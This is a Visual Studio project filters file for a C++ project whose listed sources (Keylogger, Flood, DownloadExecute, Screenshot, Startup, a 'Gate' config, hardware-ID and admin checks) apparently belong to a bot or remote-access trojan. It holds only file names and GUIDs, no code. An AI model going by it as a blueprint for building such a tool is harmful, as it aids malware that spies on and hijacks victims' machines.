<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Source Files\HTTP">
      <UniqueIdentifier>{5532dc48-b030-4c66-b337-c42ea18d160f}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\HTTP">
      <UniqueIdentifier>{07f5494a-46f4-48b5-9734-b844d44704f5}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Sockets">
      <UniqueIdentifier>{8d065270-bc1d-4fdf-b16d-974d3773658a}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Sockets">
      <UniqueIdentifier>{758a2194-598f-4ecb-9884-45cfac99b9e4}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Config">
      <UniqueIdentifier>{a3424cc0-5ea3-439d-9d07-e235f54af1a6}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\CString">
      <UniqueIdentifier>{590f3090-c258-4d2d-8b92-d0a0984afda4}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\CString">
      <UniqueIdentifier>{de9ac1e3-567b-43eb-b57f-2885528ba6ad}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Encryption">
      <UniqueIdentifier>{4e83736e-7066-43b0-8173-40e0cb8236d4}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Encryption">
      <UniqueIdentifier>{9bd36b52-7cf8-40ed-bc06-a6c9cb20b63c}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Encoding">
      <UniqueIdentifier>{f57dc79f-7b66-4da9-b5ba-696653afeefe}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Encoding">
      <UniqueIdentifier>{7de75176-7a58-4ef2-92a3-5d146be7a9c8}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Helpers">
      <UniqueIdentifier>{114635cd-f68d-4faa-912b-5691924421c0}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Helpers">
      <UniqueIdentifier>{688c5435-0fa1-43bb-a668-38bc8193a833}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Config">
      <UniqueIdentifier>{40b9e90e-2310-402f-977e-7fd9314df036}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="HttpQuery.cpp">
      <Filter>Source Files\HTTP</Filter>
    </ClCompile>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SocketInit.cpp">
      <Filter>Source Files\Sockets</Filter>
    </ClCompile>
    <ClCompile Include="Sockets.cpp">
      <Filter>Source Files\Sockets</Filter>
    </ClCompile>
    <ClCompile Include="StringOperations.cpp">
      <Filter>Source Files\CString</Filter>
    </ClCompile>
    <ClCompile Include="xor.cpp">
      <Filter>Source Files\Encryption</Filter>
    </ClCompile>
    <ClCompile Include="URLEncoding.cpp">
      <Filter>Source Files\Encoding</Filter>
    </ClCompile>
    <ClCompile Include="WebSafeEncryption.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="Command.cpp">
      <Filter>Source Files\Config</Filter>
    </ClCompile>
    <ClCompile Include="OSVersionChecker.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="WebsiteChecker.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="GateHelper.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="OSHwidChecker.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="OSCpuChecker.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="OSGpuChecker.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="OSNetVersionChecker.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="PEIsAdmin.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="OSGetRam.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="Keylogger.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="Flood.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="Processes.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="DownloadExecute.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="Screenshot.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
    <ClCompile Include="Startup.cpp">
      <Filter>Source Files\Helpers</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="HttpQuery.h">
      <Filter>Header Files\HTTP</Filter>
    </ClInclude>
    <ClInclude Include="Sockets.h">
      <Filter>Header Files\Sockets</Filter>
    </ClInclude>
    <ClInclude Include="SocketInit.h">
      <Filter>Header Files\Sockets</Filter>
    </ClInclude>
    <ClInclude Include="Gate.h">
      <Filter>Header Files\Config</Filter>
    </ClInclude>
    <ClInclude Include="StringOperations.h">
      <Filter>Header Files\CString</Filter>
    </ClInclude>
    <ClInclude Include="xor.h">
      <Filter>Header Files\Encryption</Filter>
    </ClInclude>
    <ClInclude Include="URLEncoding.h">
      <Filter>Header Files\Encoding</Filter>
    </ClInclude>
    <ClInclude Include="WebSafeEncryption.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="Commands.h">
      <Filter>Header Files\Config</Filter>
    </ClInclude>
    <ClInclude Include="OSVersionChecker.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="WebsiteChecker.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="GateHelper.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="OSHwidChecker.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="OSCpuChecker.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="OSGpuChecker.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="OSNetVersionChecker.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="PeIsAdmin.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="OSGetRam.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="Keylogger.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="Flood.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="Processes.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="DownloadExecute.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="Screenshot.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="Startup.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
    <ClInclude Include="AggressiveOptimize.h">
      <Filter>Header Files\Helpers</Filter>
    </ClInclude>
  </ItemGroup>
</Project>